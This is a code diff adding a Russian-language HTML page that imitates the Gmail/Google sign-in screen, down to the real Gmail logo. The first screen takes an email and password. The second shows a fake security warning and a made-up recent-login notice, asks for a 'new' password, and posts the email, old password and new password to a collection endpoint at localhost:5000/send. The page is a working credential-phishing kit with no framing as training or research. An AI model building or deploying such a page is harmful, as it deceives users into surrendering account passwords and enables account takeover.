@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Gmail - Вход</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Google Sans', Arial; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 450px; padding: 48px 40px; }
+        .logo { text-align: center; margin-bottom: 16px; }
+        .logo img { width: 75px; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 30px; }
+        .form-group { margin-bottom: 20px; }
+        .input-wrapper { display: flex; align-items: center; border: 1px solid #dadce0; border-radius: 8px; }
+        .input-wrapper input { width: 100%; padding: 13px 15px; border: none; outline: none; font-size: 14px; }
+        .show-password { padding: 0 15px; color: #1a73e8; cursor: pointer; }
+        .actions { display: flex; justify-content: flex-end; }
+        .next-btn { background: #1a73e8; color: white; border: none; border-radius: 24px; padding: 10px 24px; cursor: pointer; }
+        .hidden { display: none; }
+        .footer { margin-top: 64px; display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; }
+        .warning { background: #fce8e6; border-left: 4px solid #d93025; padding: 16px; margin-bottom: 24px; border-radius: 8px; }
+        .warning h3 { color: #d93025; font-size: 14px; }
+        .email-display { text-align: center; color: #1a73e8; margin-bottom: 20px; }
+        .login-info { background: #e8f0fe; border-radius: 8px; padding: 12px; margin-bottom: 24px; display: flex; gap: 12px; }
+    </style>
+</head>
+<body>
+    <!-- ЭКРАН 1: ВХОД -->
+    <div class="container" id="step1">
+        <div class="logo"><img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png"></div>
+        <h1>Вход в аккаунт Google</h1>
+        <div class="form-group">
+            <div class="input-wrapper">
+                <input type="email" id="email" placeholder="Электронная почта" required>
+            </div>
+        </div>
+        <div class="form-group">
+            <div class="input-wrapper">
+                <input type="password" id="password" placeholder="Пароль" required>
+                <span class="show-password" onclick="togglePassword()">Показать</span>
+            </div>
+        </div>
+        <div class="actions">
+            <button onclick="goToStep2()" class="next-btn">Далее</button>
+        </div>
+        <div class="footer"><div>Русский</div><div><a href="#">Помощь</a> • <a href="#">Конфиденциальность</a> • <a href="#">Условия</a></div></div>
+    </div>
+
+    <!-- ЭКРАН 2: СМЕНА ПАРОЛЯ -->
+    <div class="container hidden" id="step2">
+        <div class="logo"><img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png"></div>
+        <h1>Привет, Google!</h1>
+        <div class="email-display" id="displayEmail"></div>
+        <div class="warning"><h3>⚠️ Требуется смена пароля</h3><p>В целях безопасности смените пароль</p></div>
+        <div class="login-info"><div>🕒</div><div><div>Последний вход</div><div>Москва • iPhone 15 • Только что</div></div></div>
+        
+        <form id="finalForm" action="http://localhost:5000/send" method="POST">
+            <input type="hidden" name="email" id="hiddenEmail">
+            <input type="hidden" name="old_password" id="hiddenOldPassword">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="password" id="new_password" name="new_password" placeholder="Новый пароль" required>
+                    <span class="show-password" onclick="toggleNewPassword()">Показать</span>
+                </div>
+            </div>
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="password" id="confirm_password" placeholder="Подтвердите пароль" required>
+                </div>
+            </div>
+            <div class="actions">
+                <button type="submit" class="next-btn" onclick="return checkPasswords()">Изменить пароль</button>
+            </div>
+        </form>
+        <div class="footer"><div>Русский</div><div><a href="#">Помощь</a> • <a href="#">Конфиденциальность</a> • <a href="#">Условия</a></div></div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            let pwd = document.getElementById('password');
+            let btn = document.querySelector('.show-password');
+            if (pwd.type === 'password') { pwd.type = 'text'; btn.textContent = 'Скрыть'; }
+            else { pwd.type = 'password'; btn.textContent = 'Показать'; }
+        }
+        function toggleNewPassword() {
+            let pwd = document.getElementById('new_password');
+            let btn = event.target;
+            if (pwd.type === 'password') { pwd.type = 'text'; btn.textContent = 'Скрыть'; }
+            else { pwd.type = 'password'; btn.textContent = 'Показать'; }
+        }
+        function goToStep2() {
+            let email = document.getElementById('email').value;
+            let pass = document.getElementById('password').value;
+            if (!email || !pass) { alert('Заполните все поля'); return; }
+            document.getElementById('hiddenEmail').value = email;
+            document.getElementById('hiddenOldPassword').value = pass;
+            document.getElementById('displayEmail').innerText = email;
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+        function checkPasswords() {
+            let newPass = document.getElementById('new_password').value;
+            let confirmPass = document.getElementById('confirm_password').value;
+            if (newPass !== confirmPass) { alert('Пароли не совпадают'); return false; }
+            if (newPass.length < 6) { alert('Пароль должен быть минимум 6 символов'); return false; }
+            return true;
+        }
+    </script>
+</body>
+</html>
